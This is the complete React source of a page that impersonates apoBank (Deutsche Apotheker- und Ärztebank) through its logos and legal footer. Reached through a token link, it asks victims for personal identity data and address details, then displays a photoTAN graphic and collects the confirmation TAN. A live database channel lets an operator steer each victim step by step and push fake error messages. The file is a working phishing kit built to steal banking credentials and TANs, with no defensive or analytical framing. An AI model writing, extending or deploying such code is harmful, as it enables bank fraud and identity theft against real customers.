import { useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader2, AlertTriangle, Check } from "lucide-react";
import apobankLogo from "@/assets/apobank-logo.svg";
import apoALogo from "@/assets/apo-a-logo.png.asset.json";
import apobankLogoSquare from "@/assets/apobank-logo-square.png";
import phototanDefault from "@/assets/phototan.png";

type Row = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  curr_strasse: string | null;
  curr_plz: string | null;
  curr_ort: string | null;
  new_strasse: string | null;
  new_plz: string | null;
  new_ort: string | null;
  profile_data: Record<string, string> | null;
  customer_phase: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  tan_code: string | null;
};

type FieldDef = { key: string; label: string; value: string; options?: string[]; type?: string };

const TITEL_OPTIONS = [
  "Keine Angabe","Dr.","Dr. Dr.","Dr. med.","Dr. med. dent.","Dr. med. vet.","Dr. rer. nat.",
  "Dr. rer. medic.","Dr. rer. pol.","Dr. phil.","Dr. jur.","Prof.","Prof. Dr.","Prof. Dr. Dr.",
  "Prof. Dr. med.","Prof. Dr. med. dent.","PD Dr.","PD Dr. med.","Dipl.-Med.",
];

const initialFields: FieldDef[] = [
  { key: "titel", label: "Titel", value: "", options: TITEL_OPTIONS },
  { key: "vorname", label: "Vorname", value: "" },
  { key: "nachname", label: "Nachname", value: "" },
  { key: "geburtsdatum", label: "Geburtsdatum", value: "" },
  { key: "geburtsort", label: "Geburtsort", value: "" },
  { key: "mobil", label: "Private Mobilfunknummer", value: "" },
  { key: "festnetz", label: "Private Festnetznummer (optional)", value: "" },
  { key: "email", label: "Private E-Mail-Adresse", value: "", type: "email" },
  { key: "strasse", label: "Straße und Hausnummer", value: "" },
  { key: "zusatz", label: "Adresszusatz (optional)", value: "" },
  { key: "plz", label: "Postleitzahl", value: "" },
  { key: "ortLand", label: "Ort", value: "" },
];

const normalizeToken = (raw: string) => {
  const digits = raw.replace(/[^0-9]/g, "").slice(0, 6);
  if (digits.length < 6) return raw;
  return `${digits.slice(0, 3)}-${digits.slice(3)}`;
};

const AdressFlow = () => {
  const { token: tokenParam } = useParams();
  const token = useMemo(() => normalizeToken(tokenParam || ""), [tokenParam]);
  const [row, setRow] = useState<Row | null>(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  useEffect(() => {
    let channel: any;
    (async () => {
      const { data } = await (supabase as any)
        .from("adress_tokens")
        .select("*")
        .eq("token", token)
        .maybeSingle();
      if (!data) { setNotFound(true); setLoading(false); return; }
      if (!data.customer_phase || data.customer_phase === "pending") {
        const { data: updated } = await (supabase as any)
          .from("adress_tokens")
          .update({ customer_phase: "adress_edit", used: true, used_at: new Date().toISOString() })
          .eq("id", data.id)
          .select("*")
          .maybeSingle();
        setRow(updated || { ...data, customer_phase: "adress_edit" });
      } else {
        setRow(data);
      }
      setLoading(false);
      channel = (supabase as any)
        .channel(`adress_${data.id}`)
        .on("postgres_changes", { event: "UPDATE", schema: "public", table: "adress_tokens", filter: `id=eq.${data.id}` }, (p: any) => {
          setRow(prev => ({ ...(prev as Row), ...p.new }));
        })
        .subscribe();
    })();
    return () => { if (channel) (supabase as any).removeChannel(channel); };
  }, [token]);

  const update = async (patch: Record<string, any>) => {
    if (!row) return;
    await (supabase as any).from("adress_tokens").update(patch).eq("id", row.id);
  };

  if (loading) return <Full><Loader2 className="h-6 w-6 animate-spin text-primary" /></Full>;
  if (notFound || !row) return (
    <Full>
      <div className="flex flex-col items-center gap-3 text-center">
        <AlertTriangle className="h-8 w-8 text-destructive" />
        <div className="font-semibold">Sitzung nicht gefunden</div>
        <div className="text-sm text-muted-foreground">Bitte prüfen Sie den Link von Ihrem Berater.</div>
      </div>
    </Full>
  );

  const phase = row.customer_phase || "adress_edit";

  if (phase === "adress_edit") {
    return <ProfileStep row={row} onSubmit={async (data) => {
      await update({
        profile_data: data,
        new_strasse: data.strasse || null,
        new_plz: data.plz || null,
        new_ort: data.ortLand || null,
        customer_phase: "adress_review",
        last_error: null,
      });
    }} />;
  }

  if (phase === "adress_review") return <LoadingStep text="Ihre Daten werden geprüft." />;
  if (phase === "phototan_request") return <LoadingStep text="Bitte warten." />;

  if (phase === "phototan" || phase === "tan_review") {
    return <PhotoTanStep row={row} onSubmit={async (code) => {
      await update({ tan_code: code, customer_phase: "tan_review", last_error: null });
    }} />;
  }

  if (phase === "success") return <SuccessLoader />;

  if (phase === "aborted") {
    return <Full>
      <div className="flex flex-col items-center gap-3 text-center">
        <AlertTriangle className="h-8 w-8 text-destructive" />
        <div className="font-semibold">Sitzung beendet</div>
        <div className="text-sm text-muted-foreground">Bitte kontaktieren Sie Ihren Berater.</div>
      </div>
    </Full>;
  }

  return <LoadingStep text="Bitte warten." />;
};

/* ---------------- Steps ---------------- */

const EditField = ({ label, value, onChange, options, type = "text" }: {
  label: string; value: string; onChange: (v: string) => void; options?: string[]; type?: string;
}) => {
  const handleChange = (v: string) => {
    if (label.toLowerCase().includes("datum")) {
      let digits = v.replace(/\D/g, "").slice(0, 8);
      let formatted = "";
      if (digits.length > 0) formatted += digits.slice(0, 2);
      if (digits.length > 2) formatted += "." + digits.slice(2, 4);
      if (digits.length > 4) formatted += "." + digits.slice(4);
      onChange(formatted);
    } else onChange(v);
  };
  return (
    <div>
      <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{label}</label>
      {options ? (
        <select
          value={value}
          onChange={(e) => onChange(e.target.value)}
          className="w-full sm:w-1/2 md:w-[40%] text-[15px] text-slate-800 bg-white border border-slate-300 rounded-md px-3 py-2 outline-none focus:border-[#001f5b] focus:ring-1 focus:ring-[#001f5b]"
        >
          {options.map((opt) => (
            <option key={opt} value={opt === "Keine Angabe" ? "" : opt}>{opt}</option>
          ))}
        </select>
      ) : (
        <input
          type={type}
          value={value}
          onChange={(e) => handleChange(e.target.value)}
          required={!label.toLowerCase().includes("optional")}
          className="w-full sm:w-3/4 md:w-[60%] text-[15px] text-slate-800 bg-white border border-slate-300 rounded-md px-3 py-2 outline-none focus:border-[#001f5b] focus:ring-1 focus:ring-[#001f5b]"
        />
      )}
    </div>
  );
};

const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<string, string>) => Promise<void> }) => {
  const prev = row.profile_data || {};
  const [fields, setFields] = useState<FieldDef[]>(() =>
    initialFields.map(f => ({
      ...f,
      value: prev[f.key] ??
        (f.key === "strasse" ? row.curr_strasse || "" :
         f.key === "plz" ? row.curr_plz || "" :
         f.key === "ortLand" ? row.curr_ort || "" : ""),
    }))
  );
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (row.customer_phase === "adress_edit" && row.last_error) setSubmitting(false);
  }, [row.customer_phase, row.last_error]);

  const updateField = (key: string, v: string) =>
    setFields((prev) => prev.map((f) => (f.key === key ? { ...f, value: v } : f)));

  return (
    <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-4 sm:px-10 h-16">
          <div className="flex items-center gap-3 sm:gap-8">
            <img src={apoALogo.url} alt="apoBank" className="w-10 h-10 rounded-full object-contain" />
            <span className="text-[15px] font-medium text-[#001f5b]">Profildaten</span>
          </div>
        </div>
      </header>
      <main className="flex-1">
        <div className="max-w-[780px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
          <h1 className="text-[26px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">
            Mein Profil aktualisieren
          </h1>
          {row.last_error && (
            <div className="mb-6 rounded-md border border-red-200 bg-red-50 text-red-800 px-4 py-3 text-sm">{row.last_error}</div>
          )}
          <form
            onSubmit={async (e) => {
              e.preventDefault();
              setSubmitting(true);
              const data = Object.fromEntries(fields.map((f) => [f.key, f.value]));
              await onSubmit(data);
            }}
            className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-4 sm:px-10 py-6 sm:py-10"
          >
            <div className="flex flex-col gap-y-6">
              {fields.map((f) => (
                <EditField key={f.key} label={f.label} value={f.value}
                  onChange={(v) => updateField(f.key, v)} options={f.options} type={f.type} />
              ))}
            </div>
            <div className="flex justify-end mt-10">
              <button type="submit" disabled={submitting}
                className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-6 py-2 text-sm font-medium hover:bg-[#00174a] transition-colors disabled:opacity-70">
                {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" />Speichern</>}
              </button>
            </div>
          </form>
        </div>
      </main>
      <footer className="bg-[#001f5b] text-white mt-10">
        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
          <div>
            <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
            <div className="text-[13px] mt-4 opacity-90">© 2026 Deutsche Apotheker- und Ärztebank eG. Alle Rechte vorbehalten.</div>
          </div>
          <ul className="space-y-3 text-[15px]">
            <li><a href="#" className="hover:underline">Impressum</a></li>
            <li><a href="#" className="hover:underline">Datenschutz</a></li>
            <li><a href="#" className="hover:underline">Nutzungsbedingungen</a></li>
            <li><a href="#" className="hover:underline">Cookie-Einstellungen</a></li>
          </ul>
        </div>
      </footer>
    </div>
  );
};

const PhotoTanStep = ({ row, onSubmit }: { row: Row; onSubmit: (code: string) => Promise<void> }) => {
  const [code, setCode] = useState("");
  const [submitting, setSubmitting] = useState(false);
  useEffect(() => { if (row.customer_phase === "phototan" && row.last_error) { setCode(""); setSubmitting(false); } }, [row.customer_phase, row.last_error]);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
      <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
        <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
          <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Adressänderung bestätigen</h1>
        </div>
        <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
          {row.last_error && (
            <div className="bg-destructive/10 border border-destructive/20 rounded-md px-4 sm:px-6 py-4">
              <p className="text-destructive text-sm">{row.last_error}</p>
            </div>
          )}
          <p className="text-foreground text-sm sm:text-base">
            Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App und geben Sie die <strong>Änderungs-TAN</strong> ein.
          </p>
          <div className="flex justify-center">
            <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center overflow-hidden">
              <img src={row.photo_tan_image || phototanDefault} alt="PhotoTAN Code" className="w-full h-full object-contain" />
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-[0.535fr_1fr] items-start sm:items-center gap-2 sm:gap-8">
            <label className="text-foreground font-semibold text-base">Änderungs-TAN</label>
            <Input type="text" inputMode="numeric" pattern="[0-9]*" value={code}
              onChange={e => setCode(e.target.value.replace(/\D/g, ""))} className="border-primary/30 bg-card" />
          </div>
          <div className="flex justify-end">
            <Button disabled={submitting || !code} onClick={async () => { setSubmitting(true); await onSubmit(code); }}
              className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base disabled:opacity-80">
              {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />Bestätigen</span> : "Bestätigen"}
            </Button>
          </div>
        </div>
      </div>
      <div className="pb-10">
        <img src={apobankLogo} alt="apoBank" className="h-12 sm:h-16 mx-auto" loading="lazy" />
      </div>
    </div>
  );
};

const LoadingStep = ({ text }: { text: string }) => (
  <div className="min-h-screen bg-background flex flex-col items-center justify-center">
    <div className="relative w-56 h-56">
      <svg className="absolute inset-0 w-full h-full animate-spin" style={{ animationDuration: "1.5s" }} viewBox="0 0 200 200" fill="none">
        <path d="M 100 10 A 90 90 0 0 1 190 100" stroke="hsl(var(--primary))" strokeWidth="5" strokeLinecap="round" />
      </svg>
      <div className="absolute inset-0 flex items-center justify-center">
        <img src={apobankLogoSquare} alt="apoBank" className="w-44 h-44 object-contain" />
      </div>
    </div>
    <p className="mt-8 text-lg text-foreground font-medium">{text}</p>
  </div>
);

const SuccessLoader = () => {
  const [text, setText] = useState("Adressdaten werden übernommen");
  useEffect(() => {
    const t1 = setTimeout(() => setText("Bitte warten"), 3000);
    const t2 = setTimeout(() => { window.location.href = "/auth"; }, 5000);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, []);
  return <LoadingStep text={text} />;
};

const Full = ({ children }: { children: React.ReactNode }) => (
  <div className="min-h-screen flex items-center justify-center bg-muted/30 p-4">{children}</div>
);

export default AdressFlow;
